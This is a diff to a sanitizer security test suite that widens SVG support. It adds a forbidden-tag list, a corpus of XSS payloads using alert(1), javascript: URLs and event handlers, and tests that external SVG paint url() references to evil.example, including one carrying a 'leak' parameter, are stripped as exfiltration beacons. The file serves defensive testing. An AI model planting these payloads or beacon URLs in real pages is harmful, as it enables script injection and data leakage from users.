@@ -21,13 +21,16 @@ import { JSDOM } from "jsdom";
 import { getNodeSanitizer } from "../src/core/sanitize/node.js";
 import { render } from "../src/core/render/markdown.js";
 
-// Tags that must NEVER survive. <input>/<button>/<textarea>/<label> are deliberately NOT here:
-// they are allowed for substrate apps but INERT (no <form>, every on* stripped, no form-action
-// attr), so assertInert still proves the real property — no handler, no dangerous URL — on them.
+// Tags that must NEVER survive. <input>/<button>/<textarea>/<label> are NOT here (allowed but inert).
+// <svg> and its safe shapes (rect/path/…) are NOT here either — a sanitized SVG drawing is allowed;
+// what stays forbidden is every SVG SCRIPT VECTOR (<foreignObject>, <use>, <image>, the <animate>
+// SMIL family). Stored uppercase + compared case-insensitively because SVG element tagNames keep
+// their source case (e.g. "foreignObject"), unlike HTML's uppercased tagNames.
 const FORBIDDEN_TAGS = new Set([
   "SCRIPT", "STYLE", "IFRAME", "OBJECT", "EMBED", "LINK", "META", "BASE", "FORM",
-  "SELECT", "SVG", "MATH", "NOSCRIPT", "TEMPLATE", "TITLE",
+  "SELECT", "MATH", "NOSCRIPT", "TEMPLATE", "TITLE",
   "FRAME", "FRAMESET", "APPLET",
+  "FOREIGNOBJECT", "USE", "IMAGE", "ANIMATE", "ANIMATETRANSFORM", "ANIMATEMOTION", "SET", "MPATH", "FILTER",
 ]);
 const URL_ATTRS = new Set(["href", "src", "action", "formaction", "xlink:href", "data", "background", "srcset", "poster"]);
 const BAD_SCHEME = /(?:javascript|vbscript|livescript|mocha):|data:text\/html|data:application/i;
@@ -38,7 +41,7 @@ function assertInert(sanitized: string, label: string): void {
   // No <script> even after re-serialization (mXSS frequently only re-materializes on parse).
   expect(/<script[\s/>]/i.test(document.body.innerHTML), `<script> survived [${label}]: ${sanitized}`).toBe(false);
   for (const el of Array.from(document.body.querySelectorAll("*"))) {
-    expect(FORBIDDEN_TAGS.has(el.tagName), `forbidden <${el.tagName.toLowerCase()}> survived [${label}]: ${sanitized}`).toBe(false);
+    expect(FORBIDDEN_TAGS.has(el.tagName.toUpperCase()), `forbidden <${el.tagName.toLowerCase()}> survived [${label}]: ${sanitized}`).toBe(false);
     for (const attr of Array.from(el.attributes)) {
       const name = attr.name.toLowerCase();
       expect(name.startsWith("on"), `event handler ${name} survived [${label}]: ${sanitized}`).toBe(false);
@@ -106,6 +109,17 @@ const CORPUS: Vector[] = [
   { name: "svg+xml data image (raster-only hook must reject)", src: "cure53", payload: `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">` },
   { name: "object codebase js", src: "PS", payload: `<object codebase="javascript:alert(1)" data="x"></object>` },
 
+  // --- SVG drawing surface: shapes allowed, every script vector must die ---
+  { name: "svg foreignObject html", src: "cure53", payload: `<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>` },
+  { name: "svg animate href->js", src: "PS", payload: `<svg><a><animate attributeName="href" to="javascript:alert(1)"></animate><rect width=9 height=9></rect></a></svg>` },
+  { name: "svg set onmouseover", src: "PS", payload: `<svg><rect width=9 height=9><set attributeName="onmouseover" to="alert(1)"></set></rect></svg>` },
+  { name: "svg use external", src: "cure53", payload: `<svg><use href="data:image/svg+xml;base64,PHN2Zy8+"></use></svg>` },
+  { name: "svg image js href", src: "PS", payload: `<svg><image href="javascript:alert(1)" width=9 height=9></image></svg>` },
+  { name: "svg anchor xlink js", src: "OWASP", payload: `<svg><a xlink:href="javascript:alert(1)"><rect width=9 height=9></rect></a></svg>` },
+  { name: "svg path onclick", src: "OWASP", payload: `<svg><path d="M0 0 L9 9" onclick="alert(1)"></path></svg>` },
+  { name: "svg inline style import", src: "cure53", payload: `<svg><style>@import url("//evil.example/x.css")</style><rect width=9 height=9></rect></svg>` },
+  { name: "svg animateTransform", src: "PS", payload: `<svg><rect width=9 height=9><animateTransform attributeName="transform" type="rotate"></animateTransform></rect></svg>` },
+
   // --- substrate interactive surface: tags are allowed but must stay inert ---
   { name: "input type=image js src", src: "PS", payload: `<input type="image" src="javascript:alert(1)" formaction="javascript:alert(1)">` },
   { name: "input type=file (coerced)", src: "OWASP", payload: `<input type="file">` },
@@ -168,5 +182,30 @@ describe("security corpus / negative control — raster data: image is allowed +
     const out = sanitizer.sanitizeHtml(png);
     expect(/<img[^>]+src="data:image\/png;base64,/i.test(out), `png data image should survive: ${out}`).toBe(true);
     assertInert(out, "png control");
+  });
+});
+
+// SVG paint funciri exfil: a shape isn't a script vector, but `fill`/`stroke`/`clip-path` accept a
+// `url(<iri>)` paint-server ref, so an EXTERNAL url() fires an off-page GET (a no-script beacon).
+// The sanitizer must drop those paints while keeping a LOCAL gradient ref url(#id) — that is the
+// difference between "safe to host" and "leaks on render".
+describe("security corpus / SVG paint url() — external funciri is an exfil vector", () => {
+  const exfil: Array<[string, string, string]> = [
+    ["fill external https", "fill", `<svg><rect width=9 height=9 fill="url(https://evil.example/?leak=1)"></rect></svg>`],
+    ["stroke external http", "stroke", `<svg><rect width=9 height=9 stroke="url(http://evil.example/x)"></rect></svg>`],
+    ["clip-path external", "clip-path", `<svg><rect width=9 height=9 clip-path="url(https://evil.example/c.svg#k)"></rect></svg>`],
+    ["fill protocol-relative", "fill", `<svg><rect width=9 height=9 fill="url(//evil.example/x)"></rect></svg>`],
+    ["fill whitespace-evaded", "fill", `<svg><rect width=9 height=9 fill="url(\thttps://evil.example/x)"></rect></svg>`],
+  ];
+  for (const [name, attr, payload] of exfil) {
+    it(`drops ${name}`, () => {
+      const out = sanitizer.sanitizeHtml(payload);
+      expect(/url\(\s*['"]?\s*(?!#)/i.test(out), `external url() in ${attr} survived: ${out}`).toBe(false);
+    });
+  }
+  it("keeps a LOCAL gradient ref url(#id) — discriminates, not just denies", () => {
+    const grad = `<svg><defs><linearGradient id="g"><stop offset="0%" stop-color="#fff"></stop></linearGradient></defs><rect width=9 height=9 fill="url(#g)"></rect></svg>`;
+    const out = sanitizer.sanitizeHtml(grad);
+    expect(/fill="url\(#g\)"/i.test(out), `local gradient ref should survive: ${out}`).toBe(true);
   });
 });
